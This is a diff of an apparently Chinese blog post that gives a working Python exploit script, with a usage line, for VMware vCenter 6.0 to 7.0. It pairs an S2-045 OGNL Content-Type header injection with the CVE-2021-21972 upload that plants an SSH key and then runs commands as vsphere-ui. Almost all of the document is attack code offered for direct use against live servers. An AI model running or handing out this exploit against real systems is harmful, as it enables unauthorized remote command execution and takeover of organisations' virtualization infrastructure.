@@ -7,9 +7,9 @@ tags: [vsphere, vcenter, vmware]
 ---
 
 # 开宗明义
-    通杀6.0-7.0版本
+    两个前台rce，通杀6.0-7.0版本。对于CVE-2021-21972，请自行生成公私钥填入脚本中。
 
-# exp
+# poc
 
 ```python
 import io
@@ -26,6 +26,7 @@ requests.packages.urllib3.disable_warnings()
 pub = ''
 # 私钥
 pri = '''-----BEGIN OPENSSH PRIVATE KEY-----
+xxx
 ----END OPENSSH PRIVATE KEY-----
 '''
 
@@ -42,7 +43,7 @@ def create_tar(file_dict: dict) -> io.BytesIO:
     return t
 
 
-def exec_command(ip: str, shell: str):
+def exec_command(ip: str, shell: str) -> tuple:
     ssh: paramiko.SSHClient = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(
@@ -51,10 +52,7 @@ def exec_command(ip: str, shell: str):
         username='vsphere-ui',
         pkey=paramiko.RSAKey.from_private_key(file_obj=io.StringIO(pri))
     )
-    stdin, stdout, stderr = ssh.exec_command(shell)
-    print('[+] output:')
-    print(stdout.read().decode())
-    print(stderr.read().decode())
+    return ssh.exec_command(shell)
 
 
 def poc_6_5__7(url: str, shell: str) -> bool:
@@ -73,18 +71,32 @@ def poc_6_5__7(url: str, shell: str) -> bool:
         return False
     else:
         print()
-        print('[+] Create a public key in the target server: /home/vsphere-ui/.ssh/authorized_keys, Remember to delete!')
-        exec_command(url.split('/')[2], shell)
+        stdin, stdout, stderr = exec_command((ip := url.split('/')[2]), shell)
+        print('[+] output:')
+        print(stdout.read().decode())
+        print(stderr.read().decode())
+        exec_command(ip, 'rm /home/vsphere-ui/.ssh/authorized_keys')
         return True
 
 
 def poc_6_0(url: str, shell: str) -> bool:
     base_url: str = "/statsreport/"
     header: dict = {
-        "Content-Type": "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='",
+        "Content-Type": "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
+                        "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
+                        "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
+                        "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear("
+                        ")).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='",
     }
     header["Content-Type"] = header["Content-Type"] + shell
-    header["Content-Type"] = header["Content-Type"] + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    header["Content-Type"] = header["Content-Type"] + "').(#iswin=(@java.lang.System@getProperty(" \
+                                                      "'os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{" \
+                                                      "'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new " \
+                                                      "java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(" \
+                                                      "true)).(#process=#p.start()).(#ros=(" \
+                                                      "@org.apache.struts2.ServletActionContext@getResponse(" \
+                                                      ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(" \
+                                                      "#process.getInputStream(),#ros)).(#ros.flush())} "
     r: requests.Response = requests.get(url + base_url, headers=header, verify=False)
     if len(r.text) != 0 and r.status_code != 404:
         print()
@@ -97,7 +109,7 @@ def poc_6_0(url: str, shell: str) -> bool:
 
 if __name__ == '__main__':
     print('[+] url: ' + (url := sys.argv[1]))
-    print('[+] cmd: ' + (cmd := sys.argv[2]))
+    print('[+] cmd: ' + (cmd := ' '.join(sys.argv[2:])))
     sys.stdout.write('[*] check poc for vcenter 6.0  (S2-045)')
     if poc_6_0(url, cmd):
         exit()
@@ -112,7 +124,14 @@ if __name__ == '__main__':
         print()
     print()
     print('[-] no dong')
+
+```
+
+# 用法
+
+```shell
+> python3.9 vcenter_rce.py https://xxx.xxx.xxx.xxx whoami
 ```
 
 # TODO
-    咕咕咕，CVE-2021-21972本来想找个地方写jsp的，但是ssh公私钥也能凑合用，有时间再填坑。
+    对于CVE-2021-21972本来想找个地方写jsp的，但是没找到通杀位置。写ssh公私钥也能凑合用，有时间再填坑。咕咕咕...
